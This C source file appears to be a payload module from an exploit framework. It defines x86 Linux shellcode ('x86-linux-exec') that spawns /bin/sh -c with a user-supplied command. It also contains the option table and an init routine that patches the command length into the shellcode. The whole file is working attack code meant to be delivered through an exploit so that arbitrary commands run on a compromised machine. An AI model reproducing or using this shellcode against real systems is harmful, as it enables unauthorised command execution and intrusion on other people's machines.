
#include "../payloads.h"
#include "../exploits.h"
#include <stdlib.h>

// shellcode's format
unsigned char execShellcode[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
"%s%s" 
"\x00\x57\x53\x89\xe1\xcd\x80";

void execShellcodeHelp()
{
    printf("executes provided linux command\n");
}

// shellcode's options
struct payloadParam execOptions[MAX_NUM_OF_PARAMS] = {
    { "CMD-LENGTH", INTERNAL, STRING, NULL, NOT_SET },
    { "CMD", REQUIRED, STRING, NULL, NOT_SET }
};

// shellcode's initialization
void execInit(struct Xploit *xp)
{
    struct payload *p = xp->currentPayload;

    // TODO: have library for common asm opcodes
    char temp[sizeof(unsigned int) + 1] = {0};
    temp[0] = 0xe8;
    *((unsigned int *)&temp[1]) = p->params[1].strValueLen + 1;
    setInternalPayloadOpt(xp, "CMD-LENGTH", temp, sizeof(unsigned int) + 1);
}

struct payload x86LnxExec = {
    1,
    "x86-linux-exec",
    execShellcode,
    35,
    execOptions,
    2,
    execInit,
    execShellcodeHelp
};
